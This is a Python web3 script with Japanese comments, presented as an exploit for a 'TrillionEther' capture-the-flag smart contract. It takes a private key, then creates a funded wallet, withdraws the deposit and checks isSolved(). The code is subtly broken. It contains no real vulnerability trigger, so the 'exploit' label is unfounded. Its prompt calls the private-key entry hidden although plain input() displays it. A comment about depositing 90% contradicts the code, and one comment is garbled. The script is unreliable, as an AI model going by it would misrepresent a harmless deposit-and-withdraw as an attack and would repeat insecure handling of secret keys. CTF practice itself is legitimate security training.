
import sys  # システム固有のパラメータや関数を使用するためのモジュールをインポート
import time  # 時間関連の関数を使用するためのモジュールをインポート
from decimal import Decimal  # 精密な小数計算を行うためのDecimalクラスをインポート
from web3 import Web3  # Ethereumノードと通信するためのWeb3クラスをインポート
from eth_account import Account  # Ethereumアカウント管理のためのAccountクラスをインポート
from http.client import RemoteDisconnected  # リモート接続の切断エラーをキャッチするための例外クラスをインポート

def main():
    try:
        print("=== TrillionEther CTF Exploit Script ===\n")  # スクリプトの開始メッセージを表示

        # ユーザーからの入力を動的に受け取る
        rpc_endpoint = input("Enter the RPC endpoint URL: ").strip()  # RPCエンドポイントURLを入力
        private_key = input("Enter your private key (input hidden): ").strip()  # プライベートキーを入力
        your_address = input("Enter your Ethereum address: ").strip()  # Ethereumアドレスを入力
        challenge_contract_address = input("Enter the challenge contract address: ").strip()  # チャレンジ用コントラクトアドレスを入力

        # Web3の初期化
        web3 = Web3(Web3.HTTPProvider(rpc_endpoint))  # 指定されたRPCエンドポイントを使用してWeb3インスタンスを作成
        if not web3.is_connected():
            print("Failed to connect to the RPC endpoint.")  # 接続失敗時のメッセージを表示
            sys.exit(1)  # スクリプトを終了
        print("Connected to RPC endpoint.")  # 接続成功メッセージを表示

        # アカウントの設定
        try:
            account = Account.from_key(private_key)  # プライベートキーからアカウントを生成
        except Exception as e:
            print(f"Invalid private key: {e}")  # プライベートキーが無効な場合のエラーメッセージを表示
            sys.exit(1)  # スクリプトを終了

        if account.address.lower() != your_address.lower():
            print("The provided private key does not match the provided address.")  # アドレスとプライベートキーが一致しない場合のエラーメッセージ
            sys.exit(1)  # スクリプトを終了
        print(f"Using account: {account.address}")  # 使用しているアカウントアドレスを表示

        # コントラクトABIの定義（簡略化）
        contract_abi = [
            {
                "inputs": [],
                "stateMutability": "payable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "isSolved",
                "outputs": [
                    {
                        "internalType": "bool",
                        "name": "",
                        "type": "bool"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    }
                ],
                "name": "createWallet",
                "outputs": [],
                "stateMutability": "payable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "fromWalletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "toWalletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "transfer",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "walletId",
                        "type": "uint256"
                    },
                    {
                        "internalType": "uint256",
                        "name": "amount",
                        "type": "uint256"
                    }
                ],
                "name": "withdraw",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "name": "_newWallet",
                "outputs": [
                    {
                        "internalType": "struct TrillionEther.Wallet",
                        "name": "wallet",
                        "type": "tuple",
                        "components": [
                            {
                                "internalType": "bytes32",
                                "name": "name",
                                "type": "bytes32"
                            },
                            {
                                "internalType": "uint256",
                                "name": "balance",
                                "type": "uint256"
                            },
                            {
                                "internalType": "address",
                                "name": "owner",
                                "type": "address"
                            }
                        ]
                    }
                ],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    {
                        "internalType": "uint256",
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "name": "wallets",
                "outputs": [
                    {
                        "internalType": "bytes32",
                        "name": "name",
                        "type": "bytes32"
                    },
                    {
                        "internalType": "uint256",
                        "name": "balance",
                        "type": "uint256"
                    },
                    {
                        "internalType": "address",
                        "name": "owner",
                        "type": "address"
                    }
                ],
                "stateMutability": "view",
                "type": "function"
            }
        ]

        # コントラクトインスタンスの初期化
        try:
            contract = web3.eth.contract(address=web3.to_checksum_address(challenge_contract_address), abi=contract_abi)  # コントラクトアドレスとABIを使用してコントラクトインスタンスを作成
        except Exception as e:
            print(f"Error initializing contract: {e}")  # コントラクトの初期化時にエラーが発生した場合のメッセージ
            sys.exit(1)  # スクリプトを終了
        print("Contract instance created.")  # コントラクトインスタンス作成成功メッセージを表示

        # トランザクションを構築・送信するためのヘルパー関数（リトライ機能付き）
        def send_transaction(func, *args, value=0, gas=300000, gas_price_gwei=1, retries=3, delay=5):
            attempt = 0  # リトライの試行回数を初期化
            while attempt < retries:
                try:
                    nonce = web3.eth.get_transaction_count(account.address)  # 現在のノンス（トランザクションカウント）を取得
                    tx = func(*args).build_transaction({  # トランザクションを構築
                        'from': account.address,  # 送信元アドレス
                        'nonce': nonce,  # ノンス
                        'gas': gas,  # ガスリミット
                        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),  # ガス価格（Gwei単位）
                        'value': web3.to_wei(value, 'ether')  # 送金するETHの量
                    })
                    signed_tx = web3.eth.account.sign_transaction(tx, private_key=private_key)  # トランザクションに署名
                    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)  # 署名済みトランザクションを送信
                    print(f"Transaction sent: {tx_hash.hex()}")  # 送信したトランザクションのハッシュを表示
                    receipt = web3.eth.wait_for_transaction_receipt(tx_hash)  # トランザクションの承認を待機
                    print(f"Transaction mined in block {receipt.blockNumber}.")  # トランザクションがマイニングされたブロック番号を表示
                    return receipt  # トランザクションのレシートを返す
                except RemoteDisconnected as e:
                    attempt += 1  # リトライ回数を増加
                    print(f"RemoteDisconnected Error: {e}. Retry {attempt}/{retries} after {delay} seconds.")  # 接続切断エラー時のメッセージ
                    time.sleep(delay)  # 指定された秒数待機
                except Exception as e:
                    print(f"Error during transaction: {e}")  # その他のトランザクションエラー時のメッセージ
                    print("Retrying...")  # リトライ開始のメッセージ
                    attempt += 1  # リトライ回数を増加
                    time.sleep(delay)  # 指定された秒数待機
            print("Failed to send transaction after multiple attempts.")  # リトライ回数超過時のメッセージ
            sys.exit(1)  # スクリプトを終了

        # デポジット付きで新しいウォレットを作成する関数
        def create_wallet_with_deposit(name, deposit_amount):
            print(f"\nCreating wallet '{name}' with {deposit_amount} ether.")  # ウォレット作成の開始メッセージ
            name_bytes = web3.to_bytes(text=name)  # ウォレット名をバイト形式に変換
            if len(name_bytes) > 32:
                name_bytes = name_bytes[:32]  # ウォレット名が32バイトを超える場合、32バイトに切り詰め
            elif len(name_bytes) < 32:
                name_bytes = name_bytes.ljust(32, b'\0')  # ウォレット名が32バイト未満の場合、右側にNULLバイトを追加して32バイトに
            try:
                send_transaction(contract.functions.createWallet, name_bytes, value=deposit_amount)  # createWallet関数を呼び出してウォレットを作成
                print(f"Wallet '{name}' created successfully.")  # ウォレット作成成功メッセージを表示
            except Exception as e:
                print(f"Error creating wallet '{name}': {e}")  # ウォレット作成時のエラーメッセージを表示
                sys.exit(1)  # スクリプトを終了

        # ウォレットから資金を引き出す関数
        def withdraw_funds(wallet_id, amount):
            print(f"\nWithdrawing {amount} ether from wallet ID {wallet_id}.")  # 資金引き出し開始メッセージ
            try:
                send_transaction(contract.functions.withdraw, wallet_id, web3.to_wei(amount, 'ether'))  # withdraw関数を呼び出して資金を引き出す
                print(f"Withdrawal from wallet ID {wallet_id} successful.")  # 資金引き出し成功メッセージを表示
            except Exception as e:
                print(f"Error withdrawing from wallet ID {wallet_id}: {e}")  # 資金引き出し時のエラーメッセージを表示
                sys.exit(1)  # スクリプトを終了

        # コントラクトの現在のバランスをETH単位で取得する関数
        def get_contract_balance():
            balance_wei = web3.eth.get_balance(contract.address)  # コントラクトアドレスのETHバランスをWei単位で取得
            balance_eth = Decimal(web3.from_wei(balance_wei, 'ether'))  # WeiをETHに変換し、Decimal型に変換
            print(f"Current contract balance: {balance_eth} ETH")  # コントラクトの現在のバランスを表示
            return balance_eth  # ETHバランスを返す

        # 特定のウォレットのバランスを取得する関数
        def get_wallet_balance(wallet_id):
            try:
                wallet = contract.functions.wallets(wallet_id).call()  # walletsマッピングからウォレット情報を取得
                balance_eth = Decimal(web3.from_wei(wallet[1], 'ether'))  # ウォレットのバランスをWeiからETHに変換し、Decimal型に変換
                print(f"Wallet ID {wallet_id} balance: {balance_eth} ETH")  # ウォレットのバランスを表示
                return balance_eth  # ウォレットのバランスを返す
            except Exception as e:
                print(f"Error fetching wallet ID {wallet_id}: {e}")  # ウォレットバランス取得時のエラーメッセージを表示
                sys.exit(1)  # スクリプトを終了

        # すべてのウォレットのバランスを表示する関数
        def display_all_wallet_balances(num_wallets):
            print("\n--- Wallet Balances ---")  # ウォレットバランス表示の開始メッセージ
            for i in range(num_wallets):
                get_wallet_balance(i)  # 各ウォレットのバランスを取得して表示
            print("-----------------------\n")  # ウォレットバランス表示の終了メッセージ

        # アカウントのバランスをチェックして表示する関数
        def get_account_balance():
            balance_wei = web3.eth.get_balance(account.address)  # アカウントアドレスのETHバランスをWei単位で取得
            balance_eth = Decimal(web3.from_wei(balance_wei, 'ether'))  # WeiをETHに変換し、Decimal型に変換
            print(f"Your account balance: {balance_eth} ETH")  # アカウントのバランスを表示
            return balance_eth  # アカウントのバランスを返す

        # エクスプロイトのロジックを開始
        print("\n=== Starting Exploit ===")  # エクスプロイト開始メッセージを表示

        # ステップ1: アカウントのバランスをチェック
        print("\n--- Step 1: Check Account Balance ---")  # ステップ1の開始メッセージを表示
        account_balance = get_account_balance()  # アカウントバランスを取得
        if account_balance < Decimal('1.0'):
            print("Insufficient funds in your account to proceed with the exploit.")  # 資金不足のメッセージを表示
            print("Please ensure your account has at least 1 ETH to cover deposits and gas fees.")  # 必要な資金量を通知
            sys.exit(1)  # スクリプトを終了

        # ステップ2: コントラクトのバランスをチェック
        print("\n--- Step 2: Check Contract's Balance ---")  # ステップ2の開始メッセ示
        contract_balance = get_contract_balance()  # コントラクトバランスを取得

        if contract_balance < Decimal('1.0'):
            print("Contract's balance is less than 1 ETH. Adjusting deposit amount accordingly.")  # コントラクトバランスが低い場合のメッセージ
            deposit_amount = contract_balance  # デポジット額をコントラクトバランスに設定
        else:
            # 安全なデポジット額を計算（例: アカウントバランスの90%）
            # ガス料金を推定（簡単のため ~0.001 ETHと仮定）
            estimated_gas_fee = Decimal('0.001')  # ガス料金の推定値を設定
            deposit_amount = account_balance - estimated_gas_fee  # デポジット額を計算
            print(f"Calculated deposit amount: {deposit_amount} ETH")  # 計算されたデポジット額を表示

        # ステップ3: デポジット額でウォレットを作成
        print("\n--- Step 3: Create a Wallet with Deposit ---")  # ステップ3の開始メッセージを表示
        wallet_name = "ExploitWallet"  # ウォレット名を設定
        create_wallet_with_deposit(wallet_name, float(deposit_amount))  # デポジット額でウォレットを作成（Decimalをfloatに変換）

        # ウォレット作成を確実にするために短い遅延を挿入
        time.sleep(2)  # 2秒待機

        # ステップ4: ウォレットのバランスを表示して確認
        display_all_wallet_balances(1)  # ウォレットID 0のバランスを表示

        # ステップ5: デポジット額を引き出す
        print(f"\n--- Step 5: Withdrawing {deposit_amount} ether from wallet ID 0 ---")  # ステップ5の開始メッセージを表示
        withdraw_funds(0, float(deposit_amount))  # ウォレットID 0からデポジット額を引き出す（Decimalをfloatに変換）

        # 引き出しを確実にするために短い遅延を挿入
        time.sleep(2)  # 2秒待機

        # ステップ6: 引き出し後のウォレットバランスを表示
        display_all_wallet_balances(1)  # ウォレットID 0のバランスを表示

        # ステップ7: コントラクトが解決されたかを確認
        print("\n--- Step 7: Checking if the contract is solved ---")  # ステップ7の開始メッセージを表示
        try:
            is_solved = contract.functions.isSolved().call()  # isSolved関数を呼び出して結果を取得
            if is_solved:
                print("Exploit successful! isSolved() is now True.")  # エクスプロイト成功メッセージを表示
            else:
                print("Exploit failed. isSolved() is still False.")  # エクスプロイト失敗メッセージを表示
        except Exception as e:
            print(f"Error checking isSolved: {e}")  # isSolved関数の呼び出し時にエラーが発生した場合のメッセージを表示
            sys.exit(1)  # スクリプトを終了

        # 最終的なコントラクトバランスをチェック
        print("\n--- Final Contract Balance ---")  # 最終バランスチェックの開始メッセージを表示
        final_contract_balance = get_contract_balance()  # 最終コントラクトバランスを取得
        print(f"Final contract balance: {final_contract_balance} ETH")  # 最終バランスを表示
    except KeyboardInterrupt:
        print("\nScript terminated by user.")  # ユーザーによるスクリプト終了メッセージを表示
        sys.exit(0)  # スクリプトを正常終了
    except Exception as e:
        print(f"An unexpected error occurred: {e}")  # その他の予期しないエラーのメッセージを表示
        sys.exit(1)  # スクリプトを終了

if __name__ == "__main__":
    main()  # main関数を実行

